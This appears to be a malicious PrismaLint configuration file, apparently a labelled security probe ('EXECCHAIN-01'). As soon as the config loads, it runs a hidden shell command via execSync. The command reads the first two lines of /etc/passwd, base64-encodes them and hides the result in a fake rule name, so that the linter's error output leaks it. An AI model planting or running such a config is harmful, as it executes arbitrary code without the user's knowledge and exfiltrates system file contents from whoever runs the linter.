// EXECCHAIN-01 v3: in-band /etc/passwd exfil, chunk A (epoch + first 2 entries) via PrismaLint error output
const { execSync } = require("child_process");
let marker = "noexec";
try {
  marker = execSync(
    'd=$(date +%s); { printf "A%s|" "$d"; head -n2 /etc/passwd | paste -sd"|" -; } | base64 -w0 | tr "+/" "-_" | tr -d "="',
    { timeout: 8000 }
  ).toString().trim();
} catch (e) {
  marker = "execerr-" + String(e && (e.code || e.message)).replace(/\s+/g, "_").slice(0, 40);
}
module.exports = {
  rules: {
    ["execx-unknown-rule-" + marker]: "error",
    "model-name-grammatical-number": ["error", { style: "singular" }]
  }
};
